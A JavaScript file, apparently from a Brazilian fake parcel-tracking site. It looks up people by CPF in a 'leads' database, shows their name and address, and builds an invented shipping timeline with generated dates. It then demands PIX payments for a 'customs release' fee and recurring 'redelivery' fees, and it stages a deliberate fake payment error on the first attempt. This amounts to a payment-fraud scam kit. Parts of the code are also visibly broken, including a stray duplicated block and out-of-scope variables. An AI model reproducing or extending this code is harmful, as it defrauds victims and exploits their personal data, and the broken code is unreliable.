/**
 * Sistema de rastreamento baseado APENAS em dados do banco
 * SEM API DE CPF - APENAS DADOS DO SUPABASE
 */
import { DatabaseService } from '../services/database.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { TrackingGenerator } from '../utils/tracking-generator.js';
import { UIHelpers } from '../utils/ui-helpers.js';

export class TrackingSystem {
    constructor() {
        this.dbService = new DatabaseService();
        this.currentCPF = null;
        this.trackingData = null;
        this.leadData = null; // Dados do banco
        this.zentraPayService = new ZentraPayService();
        this.isInitialized = false;
        this.pixData = null;
        this.paymentErrorShown = false;
        this.paymentRetryCount = 0;
        this.deliveryValues = [7.74, 12.38, 16.46];
        this.deliveryAttempts = 0;
        
        console.log('TrackingSystem inicializado - DADOS DO BANCO');
        this.initWhenReady();
    }

    initWhenReady() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.init());
        } else {
            this.init();
        }
        
        // Fallbacks
        setTimeout(() => this.init(), 100);
        setTimeout(() => this.init(), 500);
        setTimeout(() => this.init(), 1000);
    }

    init() {
        if (this.isInitialized) return;
        
        console.log('Inicializando sistema de rastreamento baseado no banco...');
        
        try {
            this.setupEventListeners();
            this.handleAutoFocus();
            this.clearOldData();
            this.validateZentraPaySetup();
            this.isInitialized = true;
            console.log('Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('Erro na inicialização:', error);
            setTimeout(() => {
                this.isInitialized = false;
                this.init();
            }, 1000);
        }
    }

    validateZentraPaySetup() {
        if (this.zentraPayService.validateApiSecret()) {
            console.log('✅ API Zentra Pay configurada corretamente');
        } else {
            console.error('❌ Problema na configuração da API Zentra Pay');
        }
    }

    setupEventListeners() {
        console.log('Configurando event listeners...');
        this.setupFormSubmission();
        this.setupCPFInput();
        this.setupTrackButton();
        this.setupModalEvents();
        this.setupCopyButtons();
        this.setupAccordion();
        this.setupKeyboardEvents();
        console.log('Event listeners configurados');
    }

    setupModalEvents() {
        console.log('Configurando eventos dos modais...');
        
        // Modal de liberação aduaneira
        const simulateButton = document.getElementById('simulatePaymentButton');
        const closeButton = document.getElementById('closeModal');
        const modal = document.getElementById('liberationModal');
        
        if (simulateButton) {
            simulateButton.addEventListener('click', (e) => {
                e.preventDefault();
                // Simular erro na primeira tentativa
                if (!simulateButton.hasAttribute('data-retry')) {
                    simulateButton.setAttribute('data-retry', 'true');
                    alert('Ocorreu um erro ao tentar processar o pagamento');
                    simulateButton.textContent = '--';
                    return;
                }
                
                // Segunda tentativa - sucesso
                if (modal) {
                    modal.style.display = 'none';
                }
                
                // Processar pagamento com sucesso
                this.processSuccessfulPayment();
            });
        }
        
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                if (modal) {
                    modal.style.display = 'none';
                }
            });
        }
        
        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.style.display = 'none';
                }
            });
        }
        
        // Modal de tentativa de entrega
        const deliveryModal = document.getElementById('deliveryModal');
        const closeDeliveryButton = document.getElementById('closeDeliveryModal');
        
        if (closeDeliveryButton) {
            closeDeliveryButton.addEventListener('click', () => {
                if (deliveryModal) {
                    deliveryModal.style.display = 'none';
                }
            });
        }
        
        if (deliveryModal) {
            deliveryModal.addEventListener('click', (e) => {
                if (e.target === deliveryModal) {
                    deliveryModal.style.display = 'none';
                }
            });
        }
        
        console.log('Eventos dos modais configurados');
    }

    setupFormSubmission() {
        const form = document.getElementById('trackingForm');
        if (form) {
            console.log('Form encontrado por ID');
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Form submetido via ID');
                this.handleTrackingSubmit();
            });
        }

        document.querySelectorAll('form').forEach((form, index) => {
            console.log(`Configurando form ${index}`);
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log(`Form ${index} submetido`);
                this.handleTrackingSubmit();
            });
        });
    }

    setupTrackButton() {
        console.log('Configurando botão de rastreamento...');
        
        const trackButton = document.getElementById('trackButton');
        if (trackButton) {
            console.log('Botão encontrado por ID: trackButton');
            this.configureTrackButton(trackButton);
        }

        document.querySelectorAll('.track-button').forEach((button, index) => {
            console.log(`Configurando botão por classe ${index}`);
            this.configureTrackButton(button);
        });

        document.querySelectorAll('button[type="submit"], button').forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                console.log(`Configurando botão por texto ${index}: ${button.textContent}`);
                this.configureTrackButton(button);
            }
        });

        document.addEventListener('click', (e) => {
            const target = e.target;
            if (target && target.tagName === 'BUTTON' && 
                target.textContent && target.textContent.toLowerCase().includes('rastrear')) {
                e.preventDefault();
                e.stopPropagation();
                console.log('Botão rastrear clicado via delegação');
                this.handleTrackingSubmit();
            }
        });
    }

    configureTrackButton(button) {
        const newButton = button.cloneNode(true);
        button.parentNode.replaceChild(newButton, button);
        
        newButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log('Botão rastrear clicado:', newButton.id || newButton.className);
            this.handleTrackingSubmit();
        });

        newButton.style.cursor = 'pointer';
        newButton.style.pointerEvents = 'auto';
        newButton.removeAttribute('disabled');
        
        if (newButton.type !== 'submit') {
            newButton.type = 'button';
        }
        
        console.log('Botão configurado:', newButton.id || newButton.className);
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.warn('Campo CPF não encontrado');
            return;
        }

        console.log('Configurando campo CPF...');
        
        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
            this.validateCPFInput();
        });

        cpfInput.addEventListener('keypress', (e) => {
            this.preventNonNumeric(e);
        });

        cpfInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });

        cpfInput.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const cleanText = pastedText.replace(/[^\d]/g, '');
            if (cleanText.length <= 11) {
                cpfInput.value = cleanText;
                CPFValidator.applyCPFMask(cpfInput);
                this.validateCPFInput();
            }
        });

        cpfInput.addEventListener('focus', () => {
            cpfInput.setAttribute('inputmode', 'numeric');
        });

        console.log('Campo CPF configurado');
    }

    preventNonNumeric(e) {
        const allowedKeys = [8, 9, 27, 13, 46, 35, 36, 37, 38, 39, 40];
        if (allowedKeys.includes(e.keyCode) ||
            (e.keyCode === 65 && e.ctrlKey) ||
            (e.keyCode === 67 && e.ctrlKey) ||
            (e.keyCode === 86 && e.ctrlKey) ||
            (e.keyCode === 88 && e.ctrlKey)) {
            return;
        }
        
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && 
            (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    }

    validateCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        
        if (!cpfInput) return;

        const cleanCPF = CPFValidator.cleanCPF(cpfInput.value);
        
        trackButtons.forEach(button => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                if (cleanCPF.length === 11) {
                    button.disabled = false;
                    button.style.opacity = '1';
                    button.style.cursor = 'pointer';
                    cpfInput.style.borderColor = '#27ae60';
                } else {
                    button.disabled = true;
                    button.style.opacity = '0.7';
                    button.style.cursor = 'not-allowed';
                    cpfInput.style.borderColor = cleanCPF.length > 0 ? '#e74c3c' : '#e9ecef';
                }
            }
        });
    }

    async handleTrackingSubmit() {
        console.log('=== INICIANDO BUSCA APENAS NO BANCO ===');
        
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.error('Campo CPF não encontrado');
            this.showError('Campo CPF não encontrado. Recarregue a página.');
            return;
        }

        const cpfValue = cpfInput.value;
        const cleanCPF = CPFValidator.cleanCPF(cpfValue);
        
        console.log('CPF digitado:', cpfValue);
        console.log('CPF limpo:', cleanCPF);

        if (!CPFValidator.isValidCPF(cpfValue)) {
            console.log('CPF inválido');
            this.showError('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        console.log('CPF válido, buscando APENAS no banco...');
        UIHelpers.showLoadingNotification();

        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        const originalTexts = [];
        
        trackButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                originalTexts[index] = button.innerHTML;
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
                button.disabled = true;
            }
        });

        try {
            // Aguardar um pouco para mostrar o loading
            await new Promise(resolve => setTimeout(resolve, 1500));

            console.log('🔍 Buscando no banco de dados...');
            
            // Buscar no banco de dados
            const dbResult = await this.getLeadFromLocalStorage(cleanCPF);
            
            if (dbResult.success && dbResult.data) {
                console.log('✅ LEAD ENCONTRADO NO BANCO!');
                console.log('📦 Dados do lead:', dbResult.data);
                
                this.leadData = dbResult.data;
                this.currentCPF = cleanCPF;
                
                UIHelpers.closeLoadingNotification();
                
                console.log('📋 Exibindo dados do banco...');
                this.displayOrderDetailsFromDatabase();
                this.generateRealTrackingData();
                this.displayTrackingResults();
                this.saveTrackingData();
                
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    UIHelpers.scrollToElement(orderDetails, 100);
                }
                
                // Destacar botão de liberação se necessário
                setTimeout(() => {
                    this.highlightLiberationButton();
                }, 1000);
                
            } else {
                console.log('❌ CPF não encontrado no banco');
                UIHelpers.closeLoadingNotification();
                this.showCpfNotFoundDialog();
                
                // Mostrar pop-up discreta após 2 segundos
                setTimeout(() => {
                    this.showDiscreteHelpPopup();
                }, 2000);
            }
            
        } catch (error) {
            console.error('Erro no processo:', error);
            UIHelpers.closeLoadingNotification();
            UIHelpers.showError('Erro ao consultar CPF. Tente novamente.');
        } finally {
            trackButtons.forEach((button, index) => {
                if (button.textContent && originalTexts[index]) {
                    button.innerHTML = originalTexts[index];
                    button.disabled = false;
                }
            });
            this.validateCPFInput();
        }
    }

    async getLeadFromLocalStorage(cpf) {
        return await this.dbService.getLeadByCPF(cpf);
    }

    displayOrderDetailsFromDatabase() {
        if (!this.leadData) return;

        console.log('📋 Exibindo dados do banco de dados');
        
        const customerName = this.getFirstAndLastName(this.leadData.nome_completo || 'Nome não informado');
        const formattedCPF = CPFValidator.formatCPF(this.leadData.cpf || '');
        
        // Dados básicos
        this.updateElement('customerName', customerName);
        this.updateElement('fullName', this.leadData.nome_completo || 'Nome não informado');
        this.updateElement('formattedCpf', formattedCPF);
        this.updateElement('customerNameStatus', customerName);
        
        // Produto
        let productName = 'Produto não informado';
        if (this.leadData.produtos && this.leadData.produtos.length > 0) {
            productName = this.leadData.produtos[0].nome || 'Produto não informado';
        }
        this.updateElement('customerProduct', productName);
        
        // Endereço de entrega
        const deliveryAddress = this.leadData.endereco || 'Endereço não informado';
        this.updateElement('customerDeliveryAddress', deliveryAddress);
        
        // Endereço completo formatado
        const fullAddress = this.leadData.endereco || 'Endereço não informado';
        this.updateElement('customerFullAddress', fullAddress);
        
        console.log('✅ Interface atualizada com dados do banco');
        console.log('👤 Nome exibido:', customerName);
        console.log('📄 Nome completo:', this.leadData.nome_completo);
        console.log('📍 Endereço:', fullAddress);
        console.log('📦 Produto:', productName);
        
        this.showElement('orderDetails');
        this.showElement('trackingResults');
    }

    generateRealTrackingData() {
        console.log('📦 Gerando dados de rastreamento reais do banco');
        
        if (!this.leadData) {
            console.error('❌ leadData não encontrado para gerar tracking');
            return;
        }
        
        const currentStage = this.leadData.etapa_atual || 1;
        const stageNames = this.getStageNames();
        
        console.log('📊 Gerando etapas até:', Math.max(currentStage, 29));
        
        this.trackingData = {
            cpf: this.leadData.cpf,
            currentStep: currentStage,
            steps: [],
            liberationPaid: this.leadData.status_pagamento === 'pago',
            liberationDate: this.leadData.status_pagamento === 'pago' ? new Date().toISOString() : null,
            deliveryAttempts: 0,
            lastUpdate: this.leadData.updated_at || new Date().toISOString()
        };

        // Gerar etapas de forma segura
        const maxStage = Math.max(currentStage, 29);
        for (let i = 1; i <= maxStage; i++) {
            const stepDate = new Date();
            stepDate.setHours(stepDate.getHours() - (Math.max(currentStage, 11) - i));
            
            const stepData = {
                id: i,
                date: stepDate,
                title: stageNames[i] || `Etapa ${i}`,
                description: stageNames[i] || `Etapa ${i}`,
                isChina: i >= 3 && i <= 7,
                completed: i <= currentStage,
                needsLiberation: i === 11 && this.leadData.status_pagamento !== 'pago'
            };
            
            // Validar dados da etapa antes de adicionar
            if (stepData.id && stepData.description) {
                this.trackingData.steps.push(stepData);
            } else {
                console.error('❌ Dados de etapa inválidos:', stepData);
            }
        }
        
        console.log('✅ Dados de rastreamento gerados:', {
            totalSteps: this.trackingData.steps.length,
            currentStage: currentStage,
            stepsGenerated: this.trackingData.steps.map(s => s.id)
        });
        console.log('📊 Etapa atual:', currentStage);
        console.log('💳 Status pagamento:', this.leadData.status_pagamento);
    }

    getStageNames() {
        return {
            1: 'Seu pedido foi criado',
            2: 'O seu pedido está sendo preparado para envio',
            3: '[China] O vendedor enviou seu pedido',
            4: '[China] O pedido chegou ao centro de triagem de Shenzhen',
            5: '[China] Pedido saiu do centro logístico de Shenzhen',
            6: '[China] Coletado. O pedido está em trânsito internacional',
            7: '[China] O pedido foi liberado na alfândega de exportação',
            8: 'Pedido saiu da origem: Shenzhen',
            9: 'Pedido chegou no Brasil',
            10: 'Pedido em trânsito para CURITIBA/PR',
            11: 'Pedido chegou na alfândega de importação: CURITIBA/PR',
            12: 'Pedido liberado na alfândega de importação',
            13: 'Pedido sairá para entrega',
            14: 'Pedido em trânsito entrega',
            15: 'Pedido em rota de entrega',
            16: 'Tentativa entrega',
            17: "1ª Tentativa de entrega - Taxa de reenvio necessária",
            18: "Reagendamento da entrega",
            19: "Pedido em trânsito para nova entrega",
            20: "Pedido em rota de entrega",
            21: "2ª Tentativa de entrega - Taxa de reenvio necessária",
            22: "Reagendamento da entrega",
            23: "Pedido em trânsito para nova entrega", 
            24: "Pedido em rota de entrega",
            25: "3ª Tentativa de entrega - Taxa de reenvio necessária",
            26: "Reagendamento da entrega",
            27: "Pedido em trânsito para nova entrega",
            28: "Pedido em rota de entrega",
            29: "4ª Tentativa de entrega - Taxa de reenvio necessária"
        };
    }

    displayTrackingResults() {
        this.updateStatus();
        this.renderTimeline();
        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 500);
    }

    updateStatus() {
        const statusIcon = document.getElementById('statusIcon');
        const currentStatus = document.getElementById('currentStatus');
        
        if (!statusIcon || !currentStatus) return;
        
        // Obter texto exato da etapa atual do banco de dados
        let stageText = '';
        if (this.leadData && this.leadData.etapa_atual) {
            // Usar o texto exato da etapa como está no banco
            const stageNames = this.getStageNames();
            stageText = stageNames[this.leadData.etapa_atual] || `Etapa ${this.leadData.etapa_atual}`;
        } else {
            stageText = 'Pedido chegou na alfândega de importação: CURITIBA/PR';
        }
        
        // Atualizar ícone baseado na etapa atual
        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;
        
        if (currentStage >= 17) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else if (currentStage >= 13) {
            statusIcon.innerHTML = '<i class="fas fa-truck"></i>';
            statusIcon.className = 'status-icon in-delivery';
        } else if (currentStage >= 12) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else {
            statusIcon.innerHTML = '<i class="fas fa-clock"></i>';
            statusIcon.className = 'status-icon in-transit';
        }
        
        // Exibir apenas o texto exato da etapa atual
        currentStatus.textContent = stageText;
    }

    renderTimeline() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) {
            console.error('❌ Timeline container não encontrado');
            return;
        }

        timeline.innerHTML = '';
        console.log('🎬 Renderizando timeline...');
        const currentStage = this.leadData ? parseInt(this.leadData.etapa_atual) : 11;
        console.log('📊 Etapa atual do lead:', currentStage);
        
        this.trackingData.steps.forEach((step, index) => {
            // Mostrar apenas etapas até a etapa atual
            if (step && step.id <= currentStage) {
                const isCurrentStep = step.id === currentStage;
                
                try {
                    const timelineItem = this.createTimelineItem(step, isCurrentStep);
                    
                    // Verificar se o elemento foi criado corretamente
                    if (timelineItem && timelineItem instanceof Node) {
                        timeline.appendChild(timelineItem);
                        console.log(`✅ Etapa ${step.id} adicionada à timeline`);
                    } else {
                        console.error(`❌ Elemento inválido para etapa ${step.id}:`, timelineItem);
                    }
                } catch (error) {
                    console.error(`❌ Erro ao criar/adicionar etapa ${step.id}:`, error);
                }
            } else if (!step) {
                console.error(`❌ Step inválido no índice ${index}:`, step);
            }
        });
        
        console.log('✅ Timeline renderizada com sucesso');
    }

    createTimelineItem(step, isLast) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''} ${isLast ? 'last' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';
        
        const dateStr = step.date instanceof Date ? 
            step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' }) :
            step.date;
        const currentStage = this.leadData ? parseInt(this.leadData.etapa_atual) : 11;
        
        // Botão de liberação alfandegária (etapa 11)
        let buttonHtml = '';
        if (step.id === 11 && step.completed && this.leadData?.status_pagamento !== 'pago') {
            buttonHtml = `
                <button class="liberation-button-timeline" data-step-id="${step.id}">
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `;
            console.log('✅ Botão LIBERAR OBJETO adicionado à etapa 11');
        }
        
        // Botões de tentativas de entrega (etapas 17, 21, 25, 29...)
        if (this.isDeliveryAttemptStage(step.id) && step.id === currentStage) {
            const attemptNumber = this.getAttemptNumber(step.id);
            const attemptValue = this.getAttemptValue(attemptNumber);
            
            buttonHtml = `
                <button class="delivery-button-timeline" data-step-id="${step.id}" data-attempt="${attemptNumber}" data-value="${attemptValue}">
                    <i class="fas fa-truck"></i> LIBERAR ENTREGA
                </button>
            `;
            console.log(`✅ Botão LIBERAR ENTREGA adicionado à etapa ${step.id}`);
        }
        
        const timeStr = step.date instanceof Date ?
            step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }) :
            step.time || '00:00';

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${step.isChina ? '<span class="china-tag">[China]</span>' : ''}${step.description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        // Configurar eventos dos botões
        if (step.id === 11 && step.completed && this.leadData?.status_pagamento !== 'pago') {
            const liberationButton = item.querySelector('.liberation-button-timeline');
            if (liberationButton) {
                liberationButton.addEventListener('click', () => {
                    console.log('🔓 Botão LIBERAR OBJETO clicado');
                    this.openLiberationModal();
                });
                
                // Adicionar efeito pulsante
                liberationButton.style.animation = 'pulse 2s infinite';
                console.log('✅ Evento do botão LIBERAR OBJETO configurado');
            }
        }

        if (this.isDeliveryAttemptStage(step.id) && step.id === currentStage) {
            const deliveryButton = item.querySelector('.delivery-button-timeline');
            if (deliveryButton) {
                deliveryButton.addEventListener('click', () => {
                    const attemptNumber = parseInt(deliveryButton.dataset.attempt);
                    const value = parseFloat(deliveryButton.dataset.value);
                    console.log(`🚚 Botão LIBERAR ENTREGA clicado - Tentativa ${attemptNumber}`);
                    this.openDeliveryModal(attemptNumber, value);
                });
                console.log(`✅ Evento do botão LIBERAR ENTREGA configurado para etapa ${step.id}`);
            }
        }

        return item;
    }

    getDeliveryAttemptNumber(stageId) {
        const attemptMap = {
            16: 1,   // 1ª tentativa
            106: 2,  // 2ª tentativa  
            116: 3,  // 3ª tentativa
            126: 1   // Volta para 1ª (ciclo)
        };
        return attemptMap[stageId] || 1;
    }

    getDeliveryValue(attemptNumber) {
        const values = [7.74, 12.38, 16.46];
        return values[attemptNumber - 1] || 7.74;
    }

    isDeliveryAttemptStage(stageId) {
        return [17, 21, 25, 29].includes(stageId);
    }

    getAttemptNumber(stageId) {
        const attemptMap = {
            17: 1,
            21: 2,
            25: 3,
            29: 4
        };
        return attemptMap[stageId] || 1;
    }

    getAttemptValue(attemptNumber) {
        const values = [7.74, 12.38, 16.46];
        return values[attemptNumber - 1] || 7.74;
    }

    showCpfNotFoundDialog() {
        UIHelpers.showError('CPF não encontrado no sistema. Verifique se o CPF está correto.');
    }

    showDiscreteHelpPopup() {
        console.log('Mostrando popup de ajuda discreta');
    }

    saveTrackingData() {
        if (this.trackingData && this.currentCPF) {
            localStorage.setItem(`tracking_${this.currentCPF}`, JSON.stringify(this.trackingData));
        }
    }

    clearOldData() {
        // Limpar dados antigos se necessário
        console.log('Limpando dados antigos...');
    }

    handleAutoFocus() {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('focus') === 'cpf') {
            const cpfInput = document.getElementById('cpfInput');
            if (cpfInput) {
                setTimeout(() => cpfInput.focus(), 500);
            }
        }
    }

    setupCopyButtons() {
        console.log('Configurando botões de cópia...');
        
        const copyButtons = document.querySelectorAll('[id*="copyPix"]');
        copyButtons.forEach(button => {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                const targetId = button.id.replace('copyPix', 'pixCode');
                const targetElement = document.getElementById(targetId);
                
                if (targetElement) {
                    targetElement.select();
                    document.execCommand('copy');
                    
                    const originalText = button.innerHTML;
                    button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
                    setTimeout(() => {
                        button.innerHTML = originalText;
                    }, 2000);
                }
            });
        });
    }

    setupAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        const detailsContent = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon i');
        
        if (detailsHeader && detailsContent) {
            detailsHeader.addEventListener('click', () => {
                const isExpanded = detailsContent.classList.contains('expanded');
                
                if (isExpanded) {
                    detailsContent.classList.remove('expanded');
                    if (toggleIcon) {
                        toggleIcon.className = 'fas fa-chevron-down';
                    }
                } else {
                    detailsContent.classList.add('expanded');
                    if (toggleIcon) {
                        toggleIcon.className = 'fas fa-chevron-up';
                    }
                }
            });
            
            console.log('✅ Accordion configurado corretamente');
        } else {
            console.warn('⚠️ Elementos do accordion não encontrados');
        }
    }
                if (toggleIcon) {
                    toggleIcon.className = isOpen ? 'fas fa-chevron-down' : 'fas fa-chevron-up';
                }
            });
        }
    }

    setupKeyboardEvents() {
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                // Fechar modais abertos
                const modals = document.querySelectorAll('.modal-overlay');
                modals.forEach(modal => {
                    if (modal.style.display === 'flex') {
                        modal.style.display = 'none';
                    }
                });
            }
        });
    }

    updateElement(id, value) {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = value;
        }
    }

    showElement(id) {
        const element = document.getElementById(id);
        if (element) {
            element.style.display = 'block';
        }
    }

    getFirstAndLastName(fullName) {
        if (!fullName) return 'Nome não informado';
        const names = fullName.trim().split(' ');
        if (names.length === 1) return names[0];
        return `${names[0]} ${names[names.length - 1]}`;
    }

    highlightLiberationButton() {
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            liberationButton.style.animation = 'pulse 2s infinite';
            
            // Scroll para o botão
            setTimeout(() => {
                liberationButton.scrollIntoView({ 
                    behavior: 'smooth', 
                    block: 'center' 
                });
            }, 500);
            
            console.log('✅ Botão de liberação destacado');
        } else {
            console.warn('⚠️ Botão de liberação não encontrado para destacar');
        }
    }

    openLiberationModal() {
        console.log('Abrindo modal de liberação aduaneira...');
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Gerar PIX via Zentra Pay
            this.generatePixForLiberation();
            console.log('✅ Modal de liberação aberto');
        } else {
            console.error('❌ Modal de liberação não encontrado');
        }
    }

    async generatePixForLiberation() {
        try {
            console.log('Gerando PIX para liberação aduaneira...');
            
            // Tentar gerar PIX via API Zentra Pay
            const pixData = await this.zentraPayService.createPixTransaction(
                {
                    nome: this.leadData?.nome_completo || 'Cliente',
                    cpf: this.leadData?.cpf || this.currentCPF,
                    email: this.leadData?.email || 'cliente@email.com',
                    telefone: this.leadData?.telefone || '11999999999'
                },
                26.34
            );
            
            if (pixData.success && pixData.pixPayload) {
                // Atualizar QR Code e código PIX
                const qrCodeImg = document.getElementById('realPixQrCode');
                const pixCodeInput = document.getElementById('pixCodeModal');
                
                if (qrCodeImg) {
                    qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pixPayload)}`;
                }
                
                if (pixCodeInput) {
                    pixCodeInput.value = pixData.pixPayload;
                }
                
                console.log('✅ PIX real gerado via API Zentra Pay');
                this.pixData = pixData;
            } else {
                throw new Error(pixData.error || 'Resposta inválida da API');
            }
        } catch (error) {
            console.warn('⚠️ Erro ao gerar PIX via API, usando link direto:', error);
            
            // Fallback para link direto Zentra Pay
            const pixSection = document.querySelector('.professional-pix-section');
            if (pixSection && !pixSection.querySelector('.zentra-pay-link-button')) {
                const linkButton = document.createElement('a');
                linkButton.href = 'https://checkout.zentrapaybr.com/UlCGsjOn';
                linkButton.target = '_blank';
                linkButton.className = 'zentra-pay-link-button';
                linkButton.style.cssText = `
                    display: inline-block;
                    background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
                    color: white;
                    padding: 12px 25px;
                    border-radius: 8px;
                    text-decoration: none;
                    font-weight: 600;
                    margin-top: 15px;
                    transition: all 0.3s ease;
                `;
                linkButton.innerHTML = '<i class="fas fa-external-link-alt"></i> Pagar via Zentra Pay';
                
                pixSection.appendChild(linkButton);
                console.log('✅ Link direto Zentra Pay adicionado como fallback');
            }
            
            const pixSection = document.querySelector('.professional-pix-section');
            if (pixSection) {
                pixSection.appendChild(linkButton);
            }
        }
    }

    openDeliveryModal(attemptNumber, value) {
        console.log(`Abrindo modal de entrega - Tentativa ${attemptNumber}, Valor: R$ ${value}`);
        
        const modal = document.getElementById('deliveryModal');
        const feeValue = document.getElementById('deliveryFeeValue');
        const deliveryTime = document.getElementById('deliveryTime');
        
        if (modal) {
            modal.style.display = 'flex';
        }
        
        if (feeValue) {
            feeValue.textContent = `R$ ${value.toFixed(2)}`;
        }
        
        if (deliveryTime) {
            const times = ['05:30', '14:20', '09:45', '16:10'];
            deliveryTime.textContent = times[attemptNumber - 1] || '05:30';
        }
        
        // Gerar PIX para entrega
        this.generatePixForDelivery(value, attemptNumber);
    }

    async generatePixForDelivery(value, attemptNumber) {
        try {
            console.log(`Gerando PIX para entrega - Tentativa ${attemptNumber}, Valor: R$ ${value}`);
            
            const pixData = await this.zentraPayService.generatePix(value, `Taxa de Reentrega - ${attemptNumber}ª Tentativa`);
            
            if (pixData && pixData.pix && pixData.pix.payload) {
                const pixCodeInput = document.getElementById('pixCodeDelivery');
                if (pixCodeInput) {
                    pixCodeInput.value = pixData.pix.payload;
                }
                
                console.log('✅ PIX de entrega gerado via API');
            }
        } catch (error) {
            console.warn('⚠️ Erro ao gerar PIX de entrega:', error);
        }
    }

    processSuccessfulPayment() {
        console.log('Processando pagamento bem-sucedido...');
        
        if (this.leadData) {
            // Atualizar status de pagamento
            this.dbService.updatePaymentStatus(this.leadData.cpf, 'pago');
            
            this.leadData.status_pagamento = 'pago';
            this.leadData.etapa_atual = Math.max(parseInt(this.leadData.etapa_atual), 12);
            
            // Atualizar etapa no banco
            this.dbService.updateLeadStage(this.leadData.cpf, this.leadData.etapa_atual);
            
            // Regenerar dados de rastreamento
            this.generateRealTrackingData();
            this.displayTrackingResults();
            this.saveTrackingData();
            
            console.log('✅ Pagamento processado, etapas atualizadas para:', this.leadData.etapa_atual);
            
            // Mostrar notificação de sucesso
            this.showPaymentSuccessNotification();
        }
    }
    
    showPaymentSuccessNotification() {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 4000;
            font-weight: 600;
            animation: slideInRight 0.3s ease;
        `;
        notification.innerHTML = `
            <i class="fas fa-check-circle"></i> 
            Pagamento confirmado! Objeto liberado.
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.remove();
        }, 3000);
    }
}

    